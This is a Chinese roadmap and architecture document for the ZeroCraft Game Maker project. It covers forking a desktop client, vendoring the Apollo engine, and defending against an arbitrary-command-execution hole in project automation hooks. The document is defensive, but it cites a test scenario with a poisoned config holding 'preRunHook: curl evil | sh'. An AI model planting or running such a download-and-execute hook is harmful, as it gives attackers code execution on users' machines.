# ZeroCraft Game Maker · 路线图与架构规划

本文档记录 ZeroCraft Game Maker 的分阶段建设计划。它是一份「活文档」，会随每个阶段的推进而更新。

## 总体定位

ZeroCraft Game Maker = **可视化制作工具（Editor / Maker）** + **内置运行引擎（Apollo 引擎）**，作为 ZeroCraft 系列 Web 游戏的统一开发与发布端。

```
┌─────────────────────────────────────────────┐
│                ZeroCraft Game Maker                │
│                                               │
│   ┌──────────────┐        ┌───────────────┐   │
│   │  制作工具端   │  产物   │   Apollo 引擎  │   │
│   │  (Editor UI) │ ─────▶ │  (Runtime)    │   │
│   │  场景/资源/逻辑 │        │  逻辑 + 数据   │   │
│   └──────────────┘        └───────────────┘   │
│            │                      │            │
│            └────── 一体化发布 ──────┘            │
└─────────────────────────────────────────────┘
                       │
                       ▼
              ZeroCraft Web 游戏
```

---

## Phase 1 —— 项目初始化（进行中）

**目标**：建立仓库骨架、分支模型与工程规范，形成可迭代的初始版本。

- [x] 初始化 Git 仓库与开发分支
- [x] 建立 `README.md` 项目总览
- [x] 建立 `.gitignore`（Web / Node 工程）
- [x] 建立本路线图文档
- [ ] 确定 Phase 2 要 fork 的开源基座项目
- [ ] 明确 Apollo 引擎当前的技术栈与数据格式（为 Phase 3 做准备）

**产出**：一个轻量、干净的初始版本，作为后续改造的落脚点。

---

## Phase 2 —— 开源基座改造（待启动）

**目标**：Fork 一个成熟的开源游戏制作工具，在其基础上裁剪 / 改造为 ZeroCraft Game Maker。

**待决策项（需要确认）**：

1. **选型**：要 fork 的开源项目是哪一个？（例如某个 Web 游戏引擎 / 可视化编辑器）
   - 技术栈（前端框架、构建工具）
   - 开源协议（License，决定我们如何改造与再发布）
   - 社区活跃度与可维护性
2. **改造范围**：保留哪些能力、移除哪些能力、需要新增哪些能力。
3. **品牌化**：命名、UI、默认工程模板替换为 ZeroCraft 风格。

**建议流程**：
- 以「上游同步友好」的方式集成（保留清晰的 fork 边界，便于后续合并上游更新）。
- 在独立分支上进行改造，评审后合入。

---

## Phase 3 —— 与 Apollo 的整合（三层口径 · 2026-07-31 裁决）

> **口径变更**：早期版本写的是「把 Apollo 塞进来当 runtime」。经双方调查后改为
> **三层分开推进**——第一层驾驶舱、第二层引擎内核、第三层接口层，各层姿势不同。
> Apollo 仓（`eaglefly628/ApolloGame`，主干 `claude/mainbranch`）**保持独立**，
> 其分支纪律、推送门禁、多 session 并行、验收体系原样保留。
>
> **红线（2026-08-01 修订）**：原写「引用不拷贝、门禁不旁路」。第二层经 owner 拍板
> 改为 vendored 搬入（理由见该层），故第一条红线调整为 **「搬运必须留同步锚点」**
> ——即 `SYNC.json` 记录来源 commit，杜绝无法追溯的漂移；**「门禁不旁路」不变**。

### 第一层：驾驶舱（立即可用，成本≈0）

ZeroCraft 当「驾驶舱」读 Apollo 仓，**不搬运任何代码**。双方机制是插头对插座：

| ZeroCraft 机制 | 对上 Apollo 的 | 落地动作 |
| --- | --- | --- |
| `workingDir` 指向任意目录 | Apollo 本地克隆 | 打开目录即可，无需配置 |
| 自动扫描 `.claude/skills` | Apollo 的 `check-ui` / `resource-manager` | 零配置生效 |
| Orca Lead/Worker 多 agent 编排 | Apollo 的 Lead/PE/GD 角色体系 | 充当「主动调用 + check」的马达 |
| Pre-run Hook（`exit 0` 放行 / `exit 2` 跳过 / 其它 fail-closed 拦截，见 `apps/desktop/src/main/scheduler-host/pre-run-hook.ts`） | Apollo 的 `scripts/scoped-gate.mjs --run`（退出码=门禁结果） | 一条命令挂上，Apollo 的门禁直接继承 |

**边界**：ZeroCraft 是 Electron 桌面端，只在本机跑；云端 session 不受益于其 GUI，
两边并行不冲突，状态统一汇到各自仓库。

### 第二层：引擎内核（**已 vendored 搬入** · 2026-08-01 owner 拍板）

> **口径修订**：本层原写「引用不搬家」。那个结论是按「ZeroCraft 当驾驶舱、帮忙开发
> Apollo」的用途推出的；owner 澄清真实目标是**把 Apollo 引擎作为 ZeroCraft 产品自身的
> 运行时**——产品的心脏留在另一个仓里用指针指着，等于本产品无法独立编译与发布。
> 且上游 39,912 文件里引擎只占 1.4%，为 554 个文件挂一个 4 万文件的 submodule 不划算。
> 故本层改为 **vendored 搬入**；第一层（驾驶舱）与第三层（接口层）口径不变。

已落地为 **`packages/apollo-engine`**（759 文件，详见该包 `README.md` 与 `SYNC.json`）：

- **引擎核心**：`engine` / `skills` / `assembly` / `renderer` / `runtime` / `net` /
  `services` / `ui` / `assets` / `debug`
- **制作端 Studio**：`studio` —— `DesignStudio` / `CreationWizard` / `GamePipelinePanel`，
  以及美术管线面板 `ArtLedgerPanel` / `AssetBrowser` / `AssetImportWizard` /
  `AssetGenPanel` / `AssetPendingReview`
- **手册与核心铁律**：`docs/playbooks`（20 份「怎么用引擎做游戏」）、`docs/rules`
  （数据驱动第一性原则、UI 契约、引擎总览、LLM onboarding）
- **美术管线工具与门禁**：`tools/` 22 个（`ledger-audit` / `styleset-ledger` /
  `asset-reconcile` / `art-resolve` / `ui-audit` / `scoped-gate` 等）

**防「两份真相」的机制 = `SYNC.json` 同步锚点**：记录 vendored 自上游哪个 commit
（当前 `f23f6ee`），任何一次重新同步必须更新它，据此可精确 diff 上游引擎面的增量。

**没搬的**：游戏内容与美术资源（上游 37,833 个文件是美术素材，属于具体游戏）。
例外是 Studio 生产代码所依赖的两个内置样例 `game-e` / `game-f`（76 文件、无美术资源）
—— 这是搬运中发现的事实：`src/studio` 的 `AssetLibrary` / `StudioInspector` /
`assets-model` 直接 import 它们的蓝图与资源清单，后续可解耦为可插拔样例注册表。
游戏按需单独搬，方法见包内 README「搬一个游戏进来」。

**已验证**：包内引用全量静态校验，**零断链**。

#### 内容游戏搬运进度

| 游戏 | 状态 | 说明 |
| --- | --- | --- |
| `game-e` / `game-f` | 已在（随 Studio） | Studio 生产代码依赖其蓝图与资源清单，非可选 |
| **`game-i`** | **已搬入（2026-08-01，owner 指定）** | 42 源文件 + 104 美术资源（676K，103 条目索引）+ 设计文档；依赖全部落在已搬入的引擎核心，零缺口 |
| 其余（a/b/c/d/g/q/t/x/z/101/102/103） | 未搬 | 按需单独搬，方法见包内 README |

搬入 game-i 后引擎包：**308 个测试文件 / 2520 测试全绿、tsc 0 error**；
美术账本工具实测可用（`node tools/ledger-audit.mjs` → `LEDGER-AUDIT: PASS`，退出码 0，
可直接挂到 ZeroCraft 的 Pre-run Hook 上当门禁）。

**✅ 接线已完成（2026-08-01）**：

1. 引擎依赖已装（`three` / `cannon-es` / `react` / `react-dom` / `happy-dom`）；
2. 路径别名已配于包内 `vitest.config.ts`（8 个：`@engine` / `@skills` /
   `@atom-skills` / `@assets` / `@services` / `@renderer` / `@ui` / `@net`），
   与 `tsconfig.json` 的 `paths` 同形——两者必须同步，否则 tsc 过而 vitest 挂；
3. 已在 `scripts/test-workspaces.config.mjs` 登记为 `requiredUnitWorkspace`，
   纳入 `pnpm test:unit` 必跑（门禁已确认 `PASS packages/apollo-engine unit`）。

两处「上游美术库内容守卫」按不适用处理并写明理由（美术库未随引擎搬入）：
`src/assets/shelf-3d.test.ts` 整文件排除；`asset-index.test.ts` 的真实索引自检
改 `it.skipIf`（同文件另 28 条解析器逻辑测试照常运行）。两处均登记在 `SYNC.json`
的 vendor patch / 测试排除条目，**上游同步时需重新施加**。

### 第三层：接口层（唯一需要新做的，很薄）

给 ZeroCraft 侧 agent 提供一份**机读的 Apollo 接入点清单**：手册总目录在哪、
板/门禁命令怎么调、能力目录怎么查、门禁判据是什么。因 Apollo 本身即按
「状态在工件里、机器可读」设计，此层预计只是 1-2 份文档 + 一张入口清单。

### 🔴 前置阻断项：项目自动化的任意命令执行

接入 Apollo 目录**之前必须先处置**，否则「谁能写 Apollo 仓 = 谁能在本机定时执行任意命令」。

已核实的事实（勿凭记忆重判）：

- `.cindy/automations/schedules.json` 从**被打开的项目目录**读取，被当作
  **强制配置**同步进调度器 —— 源码注释原话：*"Project schedules are mandatory
  project-lead configuration… **Users cannot reject them**"*
  （`apps/desktop/src/main/scheduler-host/project-automation-loader.ts`）。
- 其 `preRunHook.command` 经 `spawn(command, { shell: true })` 由系统 shell 执行
  （POSIX `/bin/sh`），校验函数仅检查「非空字符串」，**无白名单**
  （`pre-run-hook.ts` / `hook-runtimes.ts`）。
- 即使不用 `preRunHook`，`prompt` + `cronExpr` 本身即「定时唤起一个 agent 会话」。
- `loader.reconcileAll()` 在调度器启动（应用开机）时**无条件**遍历所有已知
  workingDir 同步（`scheduler-host/index.ts`）。
- ⚠️ **本产品当前没有「关闭项目自动化」的设置开关**（仅 Android automation 有
  `isAndroidAutomationEnabled`，项目自动化没有对应物）。

因此可选处置只有两条：

1. **Apollo 侧守卫**：把 `.cindy/**` 纳入「只归主程改」清单 + CI 拦截，
   使普通 session 无法经该文件取得本机执行权。
2. **ZeroCraft 侧加闸**（我们自有 fork，可改）：新增项目自动化开关（默认关）。

**采用 1 + 2 并行**：Apollo 侧守卫防投毒源头，ZeroCraft 侧加闸做纵深防御。

#### ✅ 第 2 条已落地（2026-08-01）

- 新增 `apps/desktop/src/main/project-automation-settings-store.ts`：项目自动化
  总开关，**默认 `enabled: false`**；`normalize` 只认真正的 `true`，字符串
  `"true"` / `1` / 损坏配置一律回落为关，防被投毒配置顶开闸门。
- `ProjectAutomationLoader` 新增注入式 `isEnabled` 依赖，**收口在唯一的磁盘读取处**
  （`readProjectAutomationsFromDisk`）——`reconcile` / `reconcileAll` /
  `loadProjectSchedules` 全部经此，无绕过分支；关闭时视同「文件不存在」，
  既不读盘也不同步，并清掉已落库的 project 来源日程。
- **三重 fail-closed**：未注入 `isEnabled`、读取设置抛错、值非布尔 —— 一律按关处理。
- 关闭时 `upsertSchedule` 明确报错，不静默写一个不会生效的文件。
- 回归测试 `apps/desktop/src/main/scheduler-host/__tests__/projectAutomationGate.test.ts`
  （7 条）锁死上述语义，含「攻击者配置带 `preRunHook: curl evil | sh` 时关闭状态下不被读取」。

**仍待办**：第 1 条（Apollo 侧把 `.cindy/**` 纳入守卫清单）在 Apollo 仓执行；
以及在设置 UI 里暴露该开关（当前仅有 store 与 loader 闸门，尚无界面入口，
用户可手改 `<userData>/project-automation-settings.json`）。

---

## 决策记录（ADR）

后续重要技术决策将以简短条目记录在此，便于回溯。

| 日期 | 决策 | 备注 |
| --- | --- | --- |
| 2026-07-28 | 建立初始仓库与三阶段路线图 | Phase 1 启动 |
| 2026-07-28 | Phase 2 基座选定 = fork Cindy 开源客户端 | 见下方执行进度 |
| 2026-07-28 | 只改「外部展示名」为 ZeroCraft，内部 `@cindy/*` 命名空间/标识符不动 | 避免破坏 `.cindy` 插件格式 / userData / 协议契约 |
| 2026-07-28 | 云端能力暂不保留，走本地优先；简化不删代码 | owner 决策 |
| 2026-07-31 | Phase 3 改为三层口径；核实并记录项目自动化任意命令执行风险 | 纠正「可在设置里关闭项目自动化」——该开关不存在 |
| 2026-08-01 | 第二层改为 vendored 搬入 `packages/apollo-engine`（引擎+Studio+手册+美术管线工具，759 文件） | owner 拍板：引擎是本产品运行时，须能独立编译发布；以 `SYNC.json` 锚定上游 commit 防漂移 |
| 2026-08-01 | 引擎接线完成并纳入门禁；新增项目自动化总开关（默认关）堵住任意命令执行 | 引擎 308 文件/2520 测试全绿、tsc 0 error；安全闸含 7 条回归测试 |
| 2026-08-01 | 搬入首个内容游戏 `game-i`（owner 指定） | 42 源文件 + 104 美术资源；游戏属内容快照，直接拷贝不留指针 |

---

## Phase 2 执行进度（2026-07-28）

已完成并推送到 `main`：

- ✅ **导入基座**：Cindy 开源客户端 vendored 进仓库（5903 文件；`cindy-protocol` 改普通文件、去 submodule），保留 Apache-2.0 `LICENSE`/`NOTICE`。上游锁定 `8bb7251`。
- ✅ **外部改名 ZeroCraft**：`packages/maker-shared/src/branding.ts` 的 `BRAND_NAME` 单点改为 `ZeroCraft`（Dock/菜单/关于/Finder 显示名/应用内文案/LLM 可见名全部生效）；根与 desktop `package.json`、README、NOTICE 同步。**内部 `@cindy/*` 命名空间与标识符（appId/scheme/userData/executableName）刻意不动**。
- ✅ **macOS 本地打包**：`forge.config.ts` 新增 best-effort `MakerDMG`（darwin，卷名=ZeroCraft，try/require 守卫，不入 lockfile）；`docs/BUILD-MACOS.md` 给出 M 系列本机 ad-hoc 打包指南。确认 `--no-sign` 无签名路径可用。
- ✅ **构建校验（无头容器）**：`pnpm install`（desktop scoped）通过、原生模块编译通过；`pnpm --filter desktop typecheck` **0 error**；`build:remote-bundles` 预构建步骤通过。
- ✅ **CI 精简**：移除依赖 submodule 的上游 CI（在本仓会红），换成 `zerocraft-ci`（装桌面依赖 + typecheck 的绿色路径）。

待办（后续）：
- ⏳ 本地优先默认：默认进本地模式、切断 TapDB/心跳/更新器回连（代码保留、只关默认）。
- ⏳ 深层去 Cindy 化：`@cindy/*` 命名空间与约 1 万处字符串的系统化替换（需在绿色基线上做，含品牌守卫/i18n）。
- ⏳ sqlite-vec 等 LFS 二进制按需回填。
- ⏳ Phase 3：整合 Apollo 引擎逻辑与数据。
